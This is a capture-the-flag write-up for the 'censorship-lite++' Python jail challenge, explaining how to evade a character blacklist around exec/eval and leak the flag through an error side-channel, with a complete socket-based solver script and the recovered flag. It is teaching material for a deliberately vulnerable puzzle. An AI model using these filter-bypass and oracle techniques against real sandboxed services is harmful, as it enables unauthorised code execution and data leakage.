# censorship-lite++

you may want to read my [censorship-lite](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/censorship-lite) writeup if you havent already (for background + better understanding)

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/65b625a5-31fd-44c4-9dbf-91f4ac241070)

main.py
```py
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```

## solution

taking a look at allowed keywords, we get these:

```
>>> [code for code in dir(__builtins__) if not any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."])] 
['EOFError', 'IOError', 'LookupError', 'OSError', 'TabError', '__doc__', 'abs', 'any', 'chr', 'hash', 'map', 'max', 'ord', 'pow', 'round', 'sum', 'vars']
```

we barely have anything to use, can't even call any functions, so the above is (mostly, you'll see why not fully) useless

luckily, we can still create numbers by adding booleans together, and we can still create booleans because `func==func` is true always.

we don't have access to parenthesis, but we can emulate them using lists and then getting the 0th index of the list by using <br>
`[<thing>][vars!=vars][vars!=vars]`. this is equivalent to `(<thing>)`

my first solution was to compare parts of the flag with characters that we are allowed to use (e.g. `"a"[flag[0]=="a"]`, then check if error), 
but i was in disbelief at how many characters were not allowed to be printed, so we could not check them to see if they were in the flag

i got `amateursCTF{??_?????_??????_????s_???_??_??gh?_??gh?_??_flag_???_the_??gh?_????d_??_?????s?_??v??}` by checking chars that were not allowed in the flag

my realization came eventually that we could compare letters in the flag to each other, instead of to string literals we make<br>
what i mean is from `"a"[flag[0]=="a"]` to `"a"[flag[0]==flag[2]]`

if the output is an error (prints zzzzzzz), then we know that those two characters are equal

then i used intuition and guesswork, along with [crossword solver](https://www.crosswordsolver.org/) to deduce the flag

```py
import socket
from time import sleep
from string import printable as allch

HOST = "amt.rs"
PORT = 31672

chars = "abcdfghjkmnopqrsuvwxyz"
chars += chars.upper()
chars += "_{}.:-=+[]()*!@#$%^&<>,./?"


printable = ""

for _ in allch:
    if _ not in "lite0123456789<:(){}*\\,-.\"' ":
        if 32 < ord(_) < 128:
            printable += _


def get_num(v):
    return "+".join([f"[vars==vars][vars!=vars]"] * v)


def get_char_payload(index2: int, index3):
    thing2 = "+" if index2 else ""
    thing3 = "+" if index3 else ""
    return f'"a"[_[[vars==vars][vars!=vars]%[vars==vars][vars!=vars]{thing2}{get_num(index2)}]==' \
           f'_[[vars==vars][vars!=vars]%[vars==vars][vars!=vars]{thing3}{get_num(index3)}]]'


total = ""
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.recv(1024)
    for i2 in range(98):
        for i3 in range(i2, 98):
            if i3 == i2:
                continue
            pl = get_char_payload(i2, i3)
            s.send((pl + "\n").encode('ascii'))
            sleep(0.01)
            if "zzzz" in s.recv(1024).decode('ascii'):
                print(i2, "==", i3)

# a m a t e u r s C T F { l e _ e l i t e _ l i t  t l e _ t i l e s _ l e t _ l e _ l i g h t _ l i
# 0 1 2 3 4 5 6 7 8 9 1011121314151617181920212223 24252627282930313233343536373839404142434445464748
# g h t _ l e _ f l a g _ t i l _ t h e _ l i g h  t _ t i l e d _ l e _ e l i t i s t _ l e v e l }
# 495051525354555657585960616263646566676869707172 73477576777879808182838485868788899091929394959697
```

we get the flag now
